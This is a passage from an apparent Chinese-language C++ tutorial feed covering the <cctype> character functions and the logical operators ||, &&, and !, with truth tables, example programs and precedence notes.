class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Analyzing text: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : text) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isalpha</span>(ch)) &#123;</span><br><span class="line">            alpha_count++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isupper</span>(ch)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is uppercase alpha.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// islower(ch)</span></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is lowercase alpha.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isdigit</span>(ch)) &#123;</span><br><span class="line">            digit_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is a digit.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">ispunct</span>(ch)) &#123;</span><br><span class="line">            punct_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is punctuation.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isspace</span>(ch)) &#123;</span><br><span class="line">            space_count++;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; (ASCII &quot;</span> &lt;&lt; <span class="keyword">int</span>(ch) &lt;&lt; <span class="string">&quot;) is whitespace.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">iscntrl</span>(ch)) &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; (ASCII &quot;</span> &lt;&lt; <span class="keyword">int</span>(ch) &lt;&lt; <span class="string">&quot;) is a control character.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is something else.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSummary:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Alphabetic: &quot;</span> &lt;&lt; alpha_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Digits: &quot;</span> &lt;&lt; digit_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Punctuation: &quot;</span> &lt;&lt; punct_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Whitespace: &quot;</span> &lt;&lt; space_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>常用的字符转换函数:</strong></p><table><thead><tr><th align="left">函数名</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>tolower(ch)</code></td><td align="left">如果 <code>ch</code> 是大写字母，返回其对应的小写字母；否则，返回 <code>ch</code> 不变。</td></tr><tr><td align="left"><code>toupper(ch)</code></td><td align="left">如果 <code>ch</code> 是小写字母，返回其对应的大写字母；否则，返回 <code>ch</code> 不变。</td></tr></tbody></table><p><strong>用法与示例 (转换函数):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;CONVERT This Message.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> lower_message = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> upper_message = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为小写</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : message) &#123;</span><br><span class="line">        lower_message += <span class="built_in">tolower</span>(ch); <span class="comment">// 将每个字符转换为小写并附加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original:  &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lowercase: &quot;</span> &lt;&lt; lower_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为大写</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : message) &#123;</span><br><span class="line">        upper_message += <span class="built_in">toupper</span>(ch); <span class="comment">// 将每个字符转换为大写并附加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Uppercase: &quot;</span> &lt;&lt; upper_message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：不区分大小写的比较</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDo you want to continue? (Y/N): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">tolower</span>(response) == <span class="string">&#x27;y&#x27;</span>) &#123; <span class="comment">// 将输入转换为小写再比较</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Continuing...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Exiting...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>&lt;cctype&gt;</code> 库提供了一套标准、可移植的函数来处理字符分类和转换，这在处理用户输入、解析文本或进行不区分大小写的操作时非常有用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.2 逻辑表达式</title>
      <link href="2025/04/26/6.2_%E9%80%BB%E8%BE%91%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>2025/04/26/6.2_%E9%80%BB%E8%BE%91%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>在 <code>if</code> 或循环的条件中，我们常常需要组合多个关系表达式或者对某个条件取反。<strong>逻辑运算符 (Logical Operators)</strong> 用于组合或修改已有的布尔表达式（或可以转换为布尔值的表达式），生成一个新的布尔结果 (<code>true</code> 或 <code>false</code>)。</p><p>C++ 主要提供三种逻辑运算符：</p><ul><li>  <strong>逻辑或 (Logical OR): <code>||</code></strong></li><li>  <strong>逻辑与 (Logical AND): <code>&amp;&amp;</code></strong></li><li>  <strong>逻辑非 (Logical NOT): <code>!</code></strong></li></ul><h2 id="6-2-1-逻辑OR运算符："><a href="#6-2-1-逻辑OR运算符：" class="headerlink" title="6.2.1 逻辑OR运算符：||"></a>6.2.1 逻辑OR运算符：||</h2><p>逻辑或运算符 <code>||</code> 用于连接两个表达式。如果<strong>至少有一个</strong>操作数为 <code>true</code>，则整个 <code>||</code> 表达式的结果为 <code>true</code>。只有当<strong>两个</strong>操作数都为 <code>false</code> 时，结果才为 <code>false</code>。</p><p><strong>真值表:</strong></p><p>| 操作数1 | 操作数2 | <code>操作数1 || 操作数2</code> |<br>| :—— | :—— | :——————- |<br>| <code>true</code>  | <code>true</code>  | <code>true</code>               |<br>| <code>true</code>  | <code>false</code> | <code>true</code>               |<br>| <code>false</code> | <code>true</code>  | <code>true</code>               |<br>| <code>false</code> | <code>false</code> | <code>false</code>              |</p><p><strong>用法与示例:</strong></p><p><code>||</code> 常用于检查多个条件中是否至少有一个满足。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input_char;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a character: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_char;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查字符是否是元音字母 (忽略大小写)</span></span><br><span class="line">    <span class="keyword">if</span> (input_char == <span class="string">&#x27;a&#x27;</span> || input_char == <span class="string">&#x27;e&#x27;</span> || input_char == <span class="string">&#x27;i&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;o&#x27;</span> || input_char == <span class="string">&#x27;u&#x27;</span> || input_char == <span class="string">&#x27;A&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;E&#x27;</span> || input_char == <span class="string">&#x27;I&#x27;</span> || input_char == <span class="string">&#x27;O&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;U&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; input_char &lt;&lt; <span class="string">&quot;&#x27; is a vowel.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; input_char &lt;&lt; <span class="string">&quot;&#x27; is not a vowel.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">bool</span> has_ticket = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 检查是否满足入场条件 (年龄小于 12 或持有门票)</span></span><br><span class="line">    <span class="keyword">if</span> (age &lt; <span class="number">12</span> || has_ticket) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Allowed entry.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Entry denied.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-2-2-逻辑AND运算符：-amp-amp"><a href="#6-2-2-逻辑AND运算符：-amp-amp" class="headerlink" title="6.2.2 逻辑AND运算符：&amp;&amp;"></a>6.2.2 逻辑AND运算符：&amp;&amp;</h2><p>逻辑与运算符 <code>&amp;&amp;</code> 用于连接两个表达式。只有当<strong>两个</strong>操作数都为 <code>true</code> 时，整个 <code>&amp;&amp;</code> 表达式的结果才为 <code>true</code>。只要有<strong>至少一个</strong>操作数为 <code>false</code>，结果就为 <code>false</code>。</p><p><strong>真值表:</strong></p><table><thead><tr><th align="left">操作数1</th><th align="left">操作数2</th><th align="left"><code>操作数1 &amp;&amp; 操作数2</code></th></tr></thead><tbody><tr><td align="left"><code>true</code></td><td align="left"><code>true</code></td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>true</code></td><td align="left"><code>false</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>true</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>false</code></td><td align="left"><code>false</code></td></tr></tbody></table><p><strong>用法与示例:</strong></p><p><code>&amp;&amp;</code> 常用于检查是否<strong>同时</strong>满足多个条件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">bool</span> has_id;</span><br><span class="line">    <span class="keyword">char</span> id_input;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Do you have an ID? (y/n): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; id_input;</span><br><span class="line">    has_id = (id_input == <span class="string">&#x27;y&#x27;</span> || id_input == <span class="string">&#x27;Y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否满足购买条件 (年龄大于等于 18 并且持有 ID)</span></span><br><span class="line">    <span class="keyword">if</span> (age &gt;= <span class="number">18</span> &amp;&amp; has_id) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Purchase approved.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Purchase denied.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Underage.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!has_id) &#123; <span class="comment">// 使用了逻辑非 !</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: No ID presented.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-2-3-用-amp-amp-来设置取值范围"><a href="#6-2-3-用-amp-amp-来设置取值范围" class="headerlink" title="6.2.3 用&amp;&amp;来设置取值范围"></a>6.2.3 用&amp;&amp;来设置取值范围</h2><p>逻辑与运算符 <code>&amp;&amp;</code> 非常适合用来检查一个值是否落在某个特定的<strong>范围</strong>内（即同时满足大于某个值和小于另一个值）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your score: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查分数是否在有效范围 [0, 100] 内</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">0</span> &amp;&amp; score &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score is valid.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// 进一步判断等级</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt;= <span class="number">60</span> &amp;&amp; score &lt; <span class="number">70</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Grade: D&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span> &amp;&amp; score &lt; <span class="number">80</span>) &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Grade: C&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ... 其他等级判断</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score is invalid (out of range 0-100).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查一个字符是否是大写字母</span></span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is an uppercase letter.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 不能像数学中那样写 <code>0 &lt;= score &lt;= 100</code>。这在 C++ 中会被解释为 <code>(0 &lt;= score) &lt;= 100</code>。<code>(0 &lt;= score)</code> 的结果是 <code>true</code> (1) 或 <code>false</code> (0)，然后这个 0 或 1 再与 100 比较，结果几乎总是 <code>true</code>，无法正确判断范围。必须使用 <code>&amp;&amp;</code> 连接两个独立的比较。</p><h2 id="6-2-4-逻辑NOT运算符："><a href="#6-2-4-逻辑NOT运算符：" class="headerlink" title="6.2.4 逻辑NOT运算符：!"></a>6.2.4 逻辑NOT运算符：!</h2><p>逻辑非运算符 <code>!</code> 是一个<strong>一元</strong>运算符（只需要一个操作数）。它将其操作数的布尔值<strong>取反</strong>：如果操作数为 <code>true</code>，结果为 <code>false</code>；如果操作数为 <code>false</code>，结果为 <code>true</code>。</p><p><strong>真值表:</strong></p><table><thead><tr><th align="left">操作数</th><th align="left"><code>!操作数</code></th></tr></thead><tbody><tr><td align="left"><code>true</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>true</code></td></tr></tbody></table><p><strong>用法与示例:</strong></p><p><code>!</code> 用于反转一个条件的结果。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> is_raining = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> items_in_cart = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不是在下雨</span></span><br><span class="line">    <span class="keyword">if</span> (!is_raining) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s not raining. Good day for a walk!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s raining. Better stay inside.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查购物车是否为空</span></span><br><span class="line">    <span class="comment">// items_in_cart == 0 也可以，但 !items_in_cart 更简洁 (利用 0 转换为 false)</span></span><br><span class="line">    <span class="keyword">if</span> (!items_in_cart) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your shopping cart is empty.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 cin 读取是否失败</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; value)) &#123; <span class="comment">// 如果读取失败 (cin 转换为 false), !cin 为 true</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input or EOF.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-2-5-逻辑运算符细节"><a href="#6-2-5-逻辑运算符细节" class="headerlink" title="6.2.5 逻辑运算符细节"></a>6.2.5 逻辑运算符细节</h2><ol><li><p><strong>优先级 (Precedence):</strong></p><ul><li><p>  逻辑非 <code>!</code> 具有最高的优先级，高于所有关系运算符和算术运算符。</p></li><li><p>  逻辑与 <code>&amp;&amp;</code> 的优先级高于逻辑或 <code>||</code>。</p></li><li><p>  逻辑运算符的优先级低于关系运算符 (<code>&lt;</code>, <code>==</code>, <code>!=</code> 等)。</p></li><li><p>  赋值运算符 (<code>=</code>) 优先级最低。</p></li><li><p>*常见优先级顺序 (高到低):**</p></li></ul><ol><li> <code>!</code></li><li> 算术运算符 (<code>*</code>, <code>/</code>, <code>%</code>, <code>+</code>, <code>-</code>)</li><li> 关系运算符 (<code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code>)</li><li> 相等运算符 (<code>==</code>, <code>!=</code>)</li><li> 逻辑与 